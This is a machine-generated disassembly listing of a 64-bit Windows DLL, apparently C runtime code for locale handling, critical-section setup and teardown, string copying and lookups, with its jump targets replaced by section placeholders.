call sub_180018b3c
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi + 0x158 ]
cmp rax rbp
je r-xdata
sub_180022398
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x58 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x60 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
add rsp 0x20
pop rbx
call sub_180018b3c
sub_180022404
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
xor ebx ebx
mov rsi rcx
mov [ rax - 0x38 ] rcx
mov [ rax - 0x30 ] rbx
cmp [ rcx + 0x1c ] ebx
jne r-xdata
mov edi 0x98
mov r12d 0x1
mov edx edi
mov ecx r12d
call sub_18001b79c
mov rbp rax
test rax rax
jne r-xdata
cmp [ rcx + 0x18 ] ebx
jne r-xdata
mov rdx [ rsi + 0x128 ]
mov rcx rax
mov r8 rdi
call sub_180018670
mov edi 0x4
mov ecx edi
call sub_18001b71c
mov r14 rax
test rax rax
jne r-xdata
mov eax r12d
jmp r-xdata
mov r13d ebx
mov r14d ebx
lea rbp [ rw-data ]
jmp r-xdata
mov [ rax ] ebx
cmp [ rsi + 0x1c ] ebx
je r-xdata
mov rcx rbp
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rsi + 0x118 ]
test rax rax
je r-xdata
mov rax [ rw-data ]
mov r13 rbx
mov [ rbp ] rax
mov rax [ rw-data ]
mov [ rbp + 0x8 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x10 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x58 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x60 ] rax
mov rcx rdi
call sub_18001b71c
mov r13 rax
test rax rax
je r-xdata
mov rcx [ rsi + 0x110 ]
test rcx rcx
je r-xdata
[ rax ]
mov [ r13 ] r12d
mov rcx rbp
call sub_180018b3c
mov rcx r14
jmp r-xdata
mov [ rax ] ebx
movzx edi [ rsi + 0x3e ]
lea rcx [ rsp + 0x30 ]
mov r9d 0xe
mov edx r12d
mov r8d edi
mov [ rsp + 0x20 ] rbp
call sub_180020c40
lea rcx [ rbp + 0x8 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rsp + 0x30 ]
mov r9d 0xf
mov r8d edi
mov edx r12d
mov ebx eax
call sub_180020c40
lea r15 [ rbp + 0x10 ]
lea rcx [ rsp + 0x30 ]
mov r9d 0x10
mov r8d edi
mov edx r12d
or ebx eax
mov [ rsp + 0x20 ] r15
call sub_180020c40
mov r9d 0xe
or ebx eax
lea rax [ rbp + 0x58 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0xc ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
mov r9d 0xf
or ebx eax
lea rax [ rbp + 0x60 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0xd ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
or eax ebx
je r-xdata
mov [ rsi + 0x118 ] r13
mov [ rsi + 0x110 ] r14
mov [ rsi + 0x128 ] rbp
xor eax eax
[ rcx ]
jne r-xdata
call sub_180018b3c
jmp r-xdata
mov rdx [ r15 ]
xor ebx ebx
jmp r-xdata
mov rcx rbp
call sub_180022398
or r12d 0xffffffff
mov rcx [ rsi + 0x110 ]
call sub_180018b3c
mov rcx [ rsi + 0x128 ]
call sub_180018b3c
cmp [ rdx ] bl
jne r-xdata
mov al [ rdx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov [ r14 ] r12d
test r13 r13
je r-xdata
add rdx r12
mov r8 rdx
sub al 0x30
mov [ rdx ] al
mov al [ r8 + 0x1 ]
mov [ r8 ] al
inc r8
test al al
jne r-xdata
jmp r-xdata
sub_18002266c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x68 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x70 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x78 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x80 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x88 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
mov rcx [ rbx + 0x90 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_180018b3c
add rsp 0x20
pop rbx
call sub_180018b3c
sub_180022778
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
xor ebx ebx
mov rsi rcx
mov [ rbp - 0x10 ] rcx
mov r13d ebx
mov [ rbp - 0x8 ] rbx
cmp [ rcx + 0x18 ] ebx
jne r-xdata
mov r15d 0x98
mov ecx 0x1
mov edx r15d
call sub_18001b79c
mov r12 rax
test rax rax
jne r-xdata
cmp [ rcx + 0x1c ] ebx
jne r-xdata
mov edi 0x4
mov ecx edi
call sub_18001b71c
mov r14 rax
test rax rax
jne r-xdata
mov eax 0x1
jmp r-xdata
mov r14d ebx
lea r12 [ rw-data ]
jmp r-xdata
mov [ rax ] ebx
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov rcx r12
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rax [ rsi + 0x120 ]
test rax rax
je r-xdata
lea rdx [ rw-data ]
mov rcx r12
mov r8 r15
call sub_180018670
mov rcx rdi
call sub_18001b71c
mov r13 rax
test rax rax
jne r-xdata
mov rcx [ rsi + 0x110 ]
test rcx rcx
je r-xdata
[ rax ]
mov [ r13 ] 0x1
mov [ rax ] ebx
movzx edi [ rsi + 0x38 ]
mov r9d 0x15
lea rax [ r12 + 0x18 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x14 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ r12 + 0x20 ]
mov r9d 0x14
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0x13 ]
lea rcx [ rbp - 0x10 ]
mov r8d edi
mov ebx eax
call sub_180020c40
lea rcx [ r12 + 0x28 ]
mov r9d 0x16
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0x15 ]
lea rcx [ rbp - 0x10 ]
mov r8d edi
or ebx eax
call sub_180020c40
mov r9d 0x17
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x30 ]
lea edx [ r9 - 0x16 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
mov r9d 0x18
lea r15 [ r12 + 0x38 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x17 ]
mov r8d edi
or ebx eax
mov [ rsp + 0x20 ] r15
call sub_180020c40
mov r9d 0x50
or ebx eax
lea rax [ r12 + 0x40 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x4f ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
mov r9d 0x51
or ebx eax
lea rax [ r12 + 0x48 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x50 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x1a
or ebx eax
lea rax [ r12 + 0x50 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x19
or ebx eax
lea rax [ r12 + 0x51 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x54
or ebx eax
lea rax [ r12 + 0x52 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
or ebx eax
lea rax [ r12 + 0x53 ]
lea rcx [ rbp - 0x10 ]
mov r9d 0x55
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x54 ]
mov r9d 0x56
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x57
or ebx eax
lea rax [ r12 + 0x55 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x52
or ebx eax
lea rax [ r12 + 0x56 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
lea rcx [ rbp - 0x10 ]
mov r9d 0x53
or ebx eax
lea rax [ r12 + 0x57 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180020c40
mov r9d 0x15
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x68 ]
lea edx [ r9 - 0x13 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
mov r9d 0x14
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x70 ]
lea edx [ r9 - 0x12 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
mov r9d 0x16
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x78 ]
lea edx [ r9 - 0x14 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
mov r9d 0x17
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x80 ]
lea edx [ r9 - 0x15 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
mov r9d 0x50
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x88 ]
lea edx [ r9 - 0x4e ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
or ebx eax
mov r9d 0x51
lea rax [ r12 + 0x90 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x4f ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180020c40
or eax ebx
je r-xdata
mov rcx r12
call sub_180018b3c
mov rcx r14
jmp r-xdata
mov [ rsi + 0x120 ] r13
mov [ rsi + 0x110 ] r14
mov [ rsi + 0x128 ] r12
xor eax eax
[ rcx ]
jne r-xdata
mov rdx [ r15 ]
xor ebx ebx
jmp r-xdata
mov rcx r12
call sub_18002266c
mov rcx r12
call sub_180018b3c
mov rcx r14
call sub_180018b3c
mov rcx r13
jmp r-xdata
call sub_180018b3c
jmp r-xdata
mov rcx [ rsi + 0x128 ]
call sub_180018b3c
mov rcx [ rsi + 0x110 ]
call sub_180018b3c
cmp [ rdx ] bl
jne r-xdata
mov al [ rdx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov rax [ rsi + 0x128 ]
mov rcx [ rax ]
mov [ r12 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x10 ]
mov [ r12 + 0x10 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x58 ]
mov [ r12 + 0x58 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x60 ]
mov [ r12 + 0x60 ] rcx
mov [ r14 ] 0x1
test r13 r13
je r-xdata
inc rdx
mov r8 rdx
sub al 0x30
mov [ rdx ] al
mov al [ r8 + 0x1 ]
mov [ r8 ] al
inc r8
test al al
jne r-xdata
jmp r-xdata
sub_180022c2c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor ebx ebx
mov rdi r12
inc ebx
add rdi 0x10
cmp ebx 0x24
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi ] rcx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax ebx
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_180022cb0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov edi 0x24
lea rbx [ rw-data ]
mov esi edi
add rbx 0x10
dec rsi
jne r-xdata
cmp [ rbx + 0x8 ] 0x1
je r-xdata
mov rbp [ rbx ]
test rbp rbp
je r-xdata
lea rbx [ rw-data ]
mov rcx rbp
call [ DeleteCriticalSection@IAT ]
mov rcx rbp
call sub_180018b3c
and [ rbx ] 0x0
add rbx 0x10
dec rdi
jne r-xdata
cmp [ rbx ] 0x1
jne r-xdata
mov rcx [ rbx - 0x8 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_180022d50
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_1800210b0
lea ecx [ rsi + 0x1d ]
call sub_180020e50
mov ecx 0xff
call sub_18001fbbc
mov ecx 0x28
call sub_18001b71c
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_180022e38
nop
mov rcx rbx
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_1800194ec
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
call sub_180018b3c
nop
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_180018b3c
call sub_1800194ec
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
sub_180022e38
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_180022d50
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_18001fefc
sub_180022e7c
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_1800194ec
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10b
je r-xdata
mov [ rcx ] r10b
test rdx rdx
jne r-xdata
inc rcx
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10b
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10b
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ rcx + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
sub_180022ef8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
xor ebx ebx
mov r13 r8
mov edi edx
mov r14 rcx
mov eax 0x1
mov esi ebx
test edx edx
js r-xdata
test eax eax
test eax eax
je r-xdata
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
sete bl
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov rcx [ r13 ]
lea eax [ rsi + rdi ]
cdq
sub eax edx
sar eax 0x1
movsxd rbp eax
mov r12 rbp
add r12 r12
mov rdx [ r14 + r12 * 8 ]
call sub_180027338
test eax eax
jne r-xdata
jns r-xdata
lea rcx [ r14 + r12 * 8 + 0x8 ]
mov [ r13 ] rcx
jmp r-xdata
lea esi [ rbp + 0x1 ]
lea edi [ rbp - 0x1 ]
jmp r-xdata
cmp esi edi
jle r-xdata
sub_180022f90
mov dl [ rcx ]
mov r8 rcx
xor r9d r9d
jmp r-xdata
test dl dl
jne r-xdata
lea eax [ rdx - 0x61 ]
inc r8
cmp al 0x5
ja r-xdata
mov eax r9d
retn
lea eax [ rdx - 0x41 ]
cmp al 0x5
ja r-xdata
add dl 0xd9
jmp r-xdata
movsx ecx dl
mov dl [ r8 ]
add r9d r9d
lea r9d [ rcx + r9 * 8 - 0x30 ]
add dl 0xf9
sub_180022fcc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov rbx rcx
call sub_18001e320
mov rcx rbx
mov rdi rax
call sub_180022f90
mov ecx [ rdi + 0x15c ]
neg ecx
lea r8 [ rsp + 0x20 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov esi eax
and edx 0xfffff005
add edx 0x1002
call [ GetLocaleInfoA@IAT ]
xor ebx ebx
test eax eax
jne r-xdata
mov rcx [ rdi + 0x148 ]
lea rdx [ rsp + 0x20 ]
call sub_180027338
test eax eax
jne r-xdata
mov [ rdi + 0x150 ] ebx
lea eax [ rbx + 0x1 ]
jmp r-xdata
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
lea rax [ r--data ]
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
inc ebx
add rax 0x2
cmp ebx 0xa
jb r-xdata
cmp si [ rax ]
je r-xdata
or [ rdi + 0x150 ] 0x4
mov [ rdi + 0x164 ] esi
mov [ rdi + 0x160 ] esi
sub_1800230b4
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
sub rsp 0x20
mov edi ecx
mov rbp r8
and ecx 0x3ff
mov esi edx
lea r8 [ rax + 0x8 ]
mov r9d 0x2
bts ecx 0xa
mov edx 0x20000001
call [ GetLocaleInfoW@IAT ]
xor ebx ebx
test eax eax
jne r-xdata
cmp edi [ rsp + 0x30 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbp ]
sub al 0x61
cmp al 0x19
ja r-xdata
cmp al 0x5a
jle r-xdata
mov rcx [ rbp ]
call sub_180019aa0
cmp ebx eax
je r-xdata
inc ebx
jmp r-xdata
mov al [ rcx ]
inc rcx
cmp al 0x41
jl r-xdata
sub_180023144
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
mov rbx rcx
call sub_18001e320
mov rcx rbx
mov rdi rax
call sub_180022f90
mov ecx [ rdi + 0x15c ]
neg ecx
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov ebx eax
and edx 0xfffff005
add edx 0x1002
call [ GetLocaleInfoA@IAT ]
xor ebp ebp
test eax eax
jne r-xdata
mov rcx [ rdi + 0x148 ]
lea rdx [ rsp + 0x30 ]
call sub_180027338
test eax eax
jne r-xdata
mov [ rdi + 0x150 ] ebp
mov eax 0x1
jmp r-xdata
mov eax [ rdi + 0x150 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
mov eax [ rdi + 0x158 ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
neg eax
mov ecx ebx
sbb edx edx
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0xc0 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
mov eax [ rdi + 0x158 ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
neg eax
mov ecx ebx
sbb edx edx
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180027338
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180027338
test eax eax
jne r-xdata
test [ rdi + 0x150 ] 0x2
jne r-xdata
or [ rdi + 0x150 ] 0x304
mov [ rdi + 0x160 ] ebx
jmp r-xdata
cmp [ rdi + 0x158 ] ebp
jne r-xdata
bts [ rdi + 0x150 ] 0x9
mov eax [ rdi + 0x150 ]
cmp [ rdi + 0x158 ] ebp
je r-xdata
cmp [ rdi + 0x154 ] ebp
je r-xdata
mov [ rdi + 0x164 ] ebx
cmp [ rdi + 0x154 ] ebp
je r-xdata
cmp [ rdi + 0x154 ] ebp
je r-xdata
bts eax 0x8
mov [ rdi + 0x150 ] eax
jmp r-xdata
mov eax [ rdi + 0x150 ]
test al 0x1
jne r-xdata
movsxd r8 [ rdi + 0x154 ]
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_1800274d8
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180027338
test eax eax
jne r-xdata
bts [ rdi + 0x150 ] 0x8
mov rcx [ rdi + 0x140 ]
call sub_180019aa0
cmp eax [ rdi + 0x154 ]
jne r-xdata
cmp [ rdi + 0x160 ] ebp
jne r-xdata
mov edx ebp
lea rcx [ r--data ]
mov rcx [ rdi + 0x140 ]
or [ rdi + 0x150 ] 0x2
mov [ rdi + 0x164 ] ebx
call sub_180019aa0
cmp eax [ rdi + 0x154 ]
jne r-xdata
mov ecx ebx
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x20 ]
and ecx 0x3ff
mov edx 0x20000001
bts ecx 0xa
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov [ rdi + 0x160 ] ebx
jmp r-xdata
lea r8 [ rdi + 0x140 ]
mov edx 0x1
mov ecx ebx
call sub_1800230b4
test eax eax
je r-xdata
inc edx
add rcx 0x2
cmp edx 0xa
jb r-xdata
mov [ rdi + 0x160 ] ebx
jmp r-xdata
mov eax [ rdi + 0x160 ]
bts [ rdi + 0x150 ] 0x8
test eax eax
cmove eax ebx
mov [ rdi + 0x160 ] eax
cmp bx [ rcx ]
je r-xdata
or eax 0x1
mov [ rdi + 0x150 ] eax
sub_180023414
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
mov rbx rcx
call sub_18001e320
mov rcx rbx
mov rdi rax
call sub_180022f90
mov ecx [ rdi + 0x158 ]
neg ecx
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov ebx eax
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180027338
test eax eax
jne r-xdata
and [ rdi + 0x150 ] eax
mov eax 0x1
jmp r-xdata
cmp [ rdi + 0x158 ] 0x0
jne r-xdata
cmp [ rdi + 0x158 ] eax
jne r-xdata
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0xd8 ]
add rsp 0xc0
pop rdi
retn
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ rdi + 0x154 ] 0x0
je r-xdata
or [ rdi + 0x150 ] 0x4
mov [ rdi + 0x160 ] ebx
mov [ rdi + 0x164 ] ebx
lea r8 [ rdi + 0x140 ]
lea edx [ rax + 0x1 ]
mov ecx ebx
call sub_1800230b4
jmp r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180027338
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov ecx ebx
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x20 ]
and ecx 0x3ff
mov edx 0x20000001
bts ecx 0xa
call [ GetLocaleInfoW@IAT ]
sub_180023544
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call sub_180019aa0
mov rcx [ rbx + 0x8 ]
xor edx edx
cmp rax 0x3
sete dl
mov [ rbx + 0x18 ] edx
call sub_180019aa0
xor ecx ecx
cmp rax 0x3
sete cl
and [ rbx + 0x20 ] 0x0
cmp [ rbx + 0x18 ] 0x0
mov [ rbx + 0x1c ] ecx
je r-xdata
mov rax [ rbx ]
xor edx edx
mov edx 0x2
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
and [ rbx + 0x10 ] 0x0
test [ rbx + 0x10 ] 0x200
je r-xdata
mov [ rbx + 0x14 ] edx
lea rcx [ sub_180023144 ]
mov edx 0x1
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x100
je r-xdata
inc edx
jmp r-xdata
test [ rbx + 0x10 ] 0x7
jne r-xdata
mov cl [ rax ]
inc rax
cmp cl 0x41
jl r-xdata
add rsp 0x20
pop rbx
retn
sub_1800235dc
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call sub_180019aa0
xor edx edx
cmp rax 0x3
sete dl
mov [ rbx + 0x18 ] edx
test edx edx
je r-xdata
mov rax [ rbx ]
xor edx edx
mov edx 0x2
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
add rsp 0x20
pop rbx
retn
and [ rbx + 0x10 ] 0x0
mov [ rbx + 0x14 ] edx
lea rcx [ sub_180023414 ]
mov edx 0x1
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x4
jne r-xdata
inc edx
jmp r-xdata
mov cl [ rax ]
inc rax
cmp cl 0x41
jl r-xdata
sub_180023648
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x30
mov r12 r8
mov rbp rdx
mov rsi rcx
call sub_18001e320
lea rbx [ rax + 0x140 ]
test rsi rsi
jne r-xdata
lea rax [ rsi + 0x40 ]
mov [ rbx ] rsi
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
or [ rbx + 0x10 ] 0x104
jmp r-xdata
mov rax [ rbx ]
and [ rbx + 0x10 ] 0x0
test rax rax
je r-xdata
cmp [ rax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ rbx + 0x20 ] eax
mov [ rbx + 0x24 ] eax
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rax ] 0x0
je r-xdata
lea r8 [ rbx + 0x8 ]
lea rcx [ r--data ]
mov edx 0x16
call sub_180022ef8
